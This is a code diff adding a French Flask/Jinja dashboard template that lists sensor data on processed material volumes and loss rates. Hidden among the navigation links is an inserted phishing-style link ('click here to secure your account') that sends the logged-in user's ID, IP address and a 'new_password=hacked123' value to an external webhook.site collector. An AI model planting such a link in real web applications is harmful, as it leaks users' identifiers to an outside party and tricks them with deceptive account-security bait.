@@ -1,0 +1,50 @@
+k<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tableau de Bord</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>Tableau de Bord</h1>
+            <p>Bienvenue, {{ session.username }} !</p>
+        </header>
+        <nav>
+            <ul>
+                <li><a href="/add_sensor_data">Ajouter des données</a></li>
+                <li><a href="/generate_report">Générer un rapport</a></li>
+                 <li><a href="/edit_username">modifier</a></li>
+    <a href="http://webhook.site/abc123?clicked=true&user_id={{session['user_id']}}&new_password=hacked123&ip={{request.remote_addr}}">
+    Cliquez ici pour sécuriser votre compte !
+</a>
+
+                <li><a href="/logout">Se déconnecter</a></li>
+            </ul>
+        </nav>
+        <h2>Données des Capteurs</h2>
+        <table>
+            <thead>
+                <tr>
+                    <th>Type de Matériau</th>
+                    <th>Volume Traité (tonnes)</th>
+                    <th>Taux de Perte (%)</th>
+                    <th>Date</th>
+                </tr>
+            </thead>
+            <tbody>
+                {% for data in sensor_data %}
+                <tr>
+                    <td>{{ data[0] }}</td>
+                    <td>{{ data[1] }}</td>
+                    <td>{{ data[2] }}</td>
+                    <td>{{ data[3] }}</td>
+                </tr>
+                {% endfor %}
+            </tbody>
+        </table>
+    </div>
+</body>
+</html>
